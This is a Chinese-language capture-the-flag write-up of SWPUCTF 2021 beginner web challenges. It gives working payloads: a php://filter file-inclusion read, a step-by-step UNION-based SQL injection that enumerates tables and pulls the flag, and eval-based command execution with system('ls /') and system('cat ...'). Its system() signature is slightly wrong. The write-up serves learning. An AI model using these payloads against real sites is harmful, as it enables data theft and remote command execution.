1.[SWPUCTF 2021 新生赛]gift_F12
F12


2.[SWPUCTF 2021 新生赛]jicao

playload:

```
GET: /?json{"x":"wllm"}
POST: id=wllmNB
```



3.[SWPUCTF 2021 新生赛]easy_md5

观察代码，要求使用GET请求获得name，用POST请求获得password，并且要使得输入的name和password的MD5的值也要相同

如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的，所以只要寻找这样的字符就好了


4.[SWPUCTF 2021 新生赛]include

进入环境提示传入一个file，传入/?file=1,显示出源代码，通过阅读源代码

![1742635374226](image/NSS/1742635374226.png)

我们可以看到我们可以通过get方法上传file，并且没有检查过滤，并且file还可以传给include_once函数，此函数的作用会包含我们指定的文件，若文件内容是php代码则会执行

php伪协议：php://filter会对数据流进行过滤和处理

我们要查看flag.php中的flag并且不能让php代码执行，所以要将flag.php中的内容base64编码再读,然后将读到的base64编码还原得到flag

playload：

```
/?file=php://filter/read/convert.base64_encode/resource=flag.php
```

5:[SWPUCTF 2021 新生赛]easy_sql

学习了一遍数据库的基本操作，由于我的操作系统是arch，所以使用了MariaDB来练习，将MariaDB连接vscode进行练习。

首先F12查看源代码，注释里面表明参数是wllm，先尝试一下 `/?wllm=1`,显示如下

![1742661145810](image/NSS/1742661145810.png)

题目说是sql注入，尝试一下 `/?wllm=1'`,显示报错可以尝试注入

首先判断有多少列

```
/?wllm=1' order by 1 --+
/?wllm=1' order by 2 --+
/?wllm=1' order by 3 --+
/?wllm=1' order by 4 --+
```

当尝试到4时会出现报错，所以得出只有3列

![1742661805219](image/NSS/1742661805219.png)

然后进行查询每行分别是什么

```
/?wllm=-1' union select 1,2,3 --+
```

得到

Your Login name:2
Your Password:3

所以第二列是name，第三列是password

尝试查询所在的数据库名称,database()会返回默认的数据库，然后通过union select 回显出来

```
/?wllm=-1' union select 1, 2, database() --+
```

得到数据库名称test_db

然后查询此数据库中有哪些表

使用group_concat(table_name),是一个聚合函数可以将多行中的table_name列的值连接成为一个字符串以逗号分隔

FROM information_schema.tables

information_schema.tables是 MySQL 的一个系统表，存储了数据库中所有表的元数据信息，包括表名、表类型、创建时间等

WHERE table_schema='test_db'

table_schema这是 `information_schema.tables` 表中的一个列，表示表所属的数据库名称

**`'test_db'`** ：这是你想要查询的数据库名称。这里过滤出属于 `test_db` 数据库的所有表。

```
?wllm=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='test_db'--+
```

![1742662788002](image/NSS/1742662788002.png)

得到两个表test_tb,users

用类似的方法查询两个表中的字段

```
?wllm=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='test_db'--+
?wllm=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='users'--+
```

在test_tb找到flag

![1742664042055](image/NSS/1742664042055.png)

查询test_tb中的flag

```
/?wllm=-1' union select 1, 2, flag from test_tb --+
```

![1742664382585](image/NSS/1742664382585.png)

补充：


5.[SWPUCTF 2021 新生赛]easyrce

题目介绍是rec漏洞，rec为远程代码执行漏洞，观察代码可以得到

![1742827765701](image/NSS/1742827765701.png)

是eval函数导致的，eval函数会直接运行代码，所以我们尝试通过输入url参数产看根目录下有什么

```
/?url=system("ls /");
```

通过ls命令我们得到了

![1742828658284](image/NSS/1742828658284.png)

然后通过cat命令查看了flllllaaaaaaggggggg文件，得到flag

```
/?url=system("cat /flllllaaaaaaggggggg");
```

system()
system() 是 PHP 中⽤于执⾏外部程序并显⽰输出的⼀个函数。这个函数接受⼀个字符串
参数，该参数是要执⾏的命令，然后在 Web 服务器上执⾏这个命令。
基本语法：

```
system(string command, int &command, int &return_var);
```

$command : 要执⾏的命令。
&$return_var （可选）：此变量将填充执⾏命令后的返回状态。

需要注意的是，使⽤ system() 或其他⽤于执⾏外部命令的函数时必须⾮常⼩⼼，特别是
当命令中包含⽤户提供的数据时。否则，你的应⽤程序将容易受到命令注⼊攻击。
